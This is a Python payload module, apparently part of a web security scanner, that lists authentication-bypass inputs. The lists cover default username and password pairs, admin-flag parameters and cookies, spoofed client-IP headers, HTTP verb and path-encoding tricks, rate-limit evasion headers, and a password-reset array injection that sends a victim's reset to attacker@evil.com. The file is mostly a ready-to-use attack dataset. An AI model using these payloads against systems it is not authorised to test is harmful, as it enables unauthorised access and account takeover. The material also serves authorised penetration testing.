"""
Authentication Bypass Payloads

Tests for:
- Default credentials
- Authentication header manipulation
- Session fixation
- Cookie manipulation
- Parameter tampering for auth bypass
- HTTP verb tampering
- IP-based auth bypass
"""

# Default credentials (username:password pairs)
DEFAULT_CREDENTIALS = [
    ('admin', 'admin'),
    ('admin', 'password'),
    ('admin', '123456'),
    ('admin', 'admin123'),
    ('administrator', 'administrator'),
    ('root', 'root'),
    ('root', 'toor'),
    ('root', 'password'),
    ('user', 'user'),
    ('test', 'test'),
    ('guest', 'guest'),
    ('demo', 'demo'),
    ('manager', 'manager'),
    ('operator', 'operator'),
    ('support', 'support'),
    ('service', 'service'),

    # Database defaults
    ('sa', ''),
    ('sa', 'sa'),
    ('postgres', 'postgres'),
    ('mysql', 'mysql'),
    ('oracle', 'oracle'),

    # Application-specific
    ('tomcat', 'tomcat'),
    ('admin', 's3cr3t'),
    ('cisco', 'cisco'),
]

# Authentication bypass via parameter manipulation
AUTH_BYPASS_PARAMS = [
    # Admin flag manipulation
    {'param': 'admin', 'values': ['1', 'true', 'yes', 'on']},
    {'param': 'is_admin', 'values': ['1', 'true', 'yes']},
    {'param': 'isAdmin', 'values': ['1', 'true', 'yes']},
    {'param': 'role', 'values': ['admin', 'administrator', 'root', 'superuser']},
    {'param': 'user_role', 'values': ['admin', 'administrator']},
    {'param': 'access_level', 'values': ['admin', '999', '1']},
    {'param': 'privilege', 'values': ['admin', 'high', '1']},

    # Authentication state manipulation
    {'param': 'authenticated', 'values': ['1', 'true', 'yes']},
    {'param': 'logged_in', 'values': ['1', 'true', 'yes']},
    {'param': 'auth', 'values': ['1', 'true', 'yes', 'admin']},
    {'param': 'login', 'values': ['1', 'true', 'yes']},

    # User ID manipulation
    {'param': 'user_id', 'values': ['1', '0', '-1', 'admin']},
    {'param': 'uid', 'values': ['1', '0', '-1', 'admin']},
    {'param': 'id', 'values': ['1', '0', '-1']},

    # Debug/bypass flags
    {'param': 'debug', 'values': ['1', 'true']},
    {'param': 'test', 'values': ['1', 'true']},
    {'param': 'bypass', 'values': ['1', 'true']},
    {'param': 'no_auth', 'values': ['1', 'true']},
    {'param': 'skip_auth', 'values': ['1', 'true']},
]

# HTTP header manipulation for auth bypass
AUTH_BYPASS_HEADERS = [
    # IP-based bypass (X-Forwarded-For, etc.)
    {'header': 'X-Forwarded-For', 'values': ['127.0.0.1', 'localhost', '10.0.0.1', '192.168.1.1']},
    {'header': 'X-Real-IP', 'values': ['127.0.0.1', 'localhost']},
    {'header': 'X-Originating-IP', 'values': ['127.0.0.1']},
    {'header': 'X-Remote-IP', 'values': ['127.0.0.1']},
    {'header': 'X-Client-IP', 'values': ['127.0.0.1']},
    {'header': 'X-Host', 'values': ['127.0.0.1', 'localhost']},
    {'header': 'X-Forwarded-Host', 'values': ['127.0.0.1', 'localhost']},
    {'header': 'True-Client-IP', 'values': ['127.0.0.1']},
    {'header': 'CF-Connecting-IP', 'values': ['127.0.0.1']},

    # Custom auth headers
    {'header': 'X-Auth-Token', 'values': ['admin', 'true', '1']},
    {'header': 'X-Api-Key', 'values': ['admin', 'test', 'development']},
    {'header': 'X-Access-Token', 'values': ['admin', 'true']},
    {'header': 'X-Admin', 'values': ['true', '1', 'yes']},
    {'header': 'X-Authenticated', 'values': ['true', '1']},
    {'header': 'X-User-Role', 'values': ['admin', 'administrator']},

    # Referer bypass
    {'header': 'Referer', 'values': ['https://admin.example.com', 'https://localhost/admin']},
    {'header': 'Origin', 'values': ['https://admin.example.com', 'null']},
]

# Cookie manipulation for auth bypass
AUTH_BYPASS_COOKIES = [
    # Admin cookies
    {'name': 'admin', 'values': ['1', 'true', 'yes']},
    {'name': 'is_admin', 'values': ['1', 'true', 'yes']},
    {'name': 'isAdmin', 'values': ['1', 'true', 'yes']},
    {'name': 'role', 'values': ['admin', 'administrator']},
    {'name': 'user_role', 'values': ['admin']},
    {'name': 'access', 'values': ['admin', 'full']},

    # Auth state cookies
    {'name': 'logged_in', 'values': ['1', 'true']},
    {'name': 'authenticated', 'values': ['1', 'true']},
    {'name': 'auth', 'values': ['1', 'true', 'admin']},
    {'name': 'loggedin', 'values': ['1', 'true']},

    # User ID cookies
    {'name': 'user_id', 'values': ['1', '0', 'admin']},
    {'name': 'uid', 'values': ['1', '0']},

    # Session manipulation
    {'name': 'session_type', 'values': ['admin', 'privileged']},
    {'name': 'user_type', 'values': ['admin', 'administrator']},
]

# HTTP verb tampering for auth bypass
HTTP_VERB_BYPASS = [
    'HEAD',      # May skip auth checks
    'OPTIONS',   # CORS preflight, often unprotected
    'TRACE',     # Debug method
    'CONNECT',   # Proxy method
    'PATCH',     # May have different ACL
    'PROPFIND',  # WebDAV
    'MKCOL',     # WebDAV
    'COPY',      # WebDAV
    'MOVE',      # WebDAV
    'LOCK',      # WebDAV
    'UNLOCK',    # WebDAV
    'ARBITRARY', # Custom/invalid method
]

# URL path manipulation for auth bypass
PATH_BYPASS_PAYLOADS = [
    # Case manipulation
    '/Admin', '/ADMIN', '/AdMiN',

    # Path traversal to admin
    '/../admin', '/./admin', '//admin',

    # Encoding bypass
    '/%61%64%6d%69%6e',  # /admin URL encoded
    '/admin%00', '/admin%00.html',  # Null byte

    # Extension bypass
    '/admin.json', '/admin.xml', '/admin.html',
    '/admin/', '/admin/.',

    # Alternate paths
    '/administrator', '/manage', '/management',
    '/dashboard', '/console', '/portal',
    '/backend', '/control', '/cpanel',

    # API versions
    '/api/v1/admin', '/api/v2/admin', '/v1/admin',
]

# Password reset bypass payloads
PASSWORD_RESET_BYPASS = [
    # Token manipulation
    {'param': 'token', 'values': ['', '0', 'null', 'undefined', 'admin']},
    {'param': 'reset_token', 'values': ['', '0', 'null']},

    # Email manipulation
    {'param': 'email', 'values': ['admin@example.com', 'admin@localhost']},

    # User manipulation
    {'param': 'user', 'values': ['admin', 'administrator', 'root']},

    # Array injection
    {'param': 'email[]', 'values': ['victim@example.com', 'attacker@evil.com']},
]

# Rate limit bypass headers
RATE_LIMIT_BYPASS_HEADERS = [
    {'header': 'X-Forwarded-For', 'value_generator': 'random_ip'},
    {'header': 'X-Real-IP', 'value_generator': 'random_ip'},
    {'header': 'X-Originating-IP', 'value_generator': 'random_ip'},
    {'header': 'X-Remote-Addr', 'value_generator': 'random_ip'},
    {'header': 'X-Client-IP', 'value_generator': 'random_ip'},
    {'header': 'CF-Connecting-IP', 'value_generator': 'random_ip'},
    {'header': 'True-Client-IP', 'value_generator': 'random_ip'},
]


def get_all_auth_bypass_payloads():
    """Get all authentication bypass payloads"""
    return {
        'default_credentials': DEFAULT_CREDENTIALS,
        'params': AUTH_BYPASS_PARAMS,
        'headers': AUTH_BYPASS_HEADERS,
        'cookies': AUTH_BYPASS_COOKIES,
        'http_verbs': HTTP_VERB_BYPASS,
        'path_bypass': PATH_BYPASS_PAYLOADS,
        'password_reset': PASSWORD_RESET_BYPASS,
        'rate_limit_bypass': RATE_LIMIT_BYPASS_HEADERS,
    }
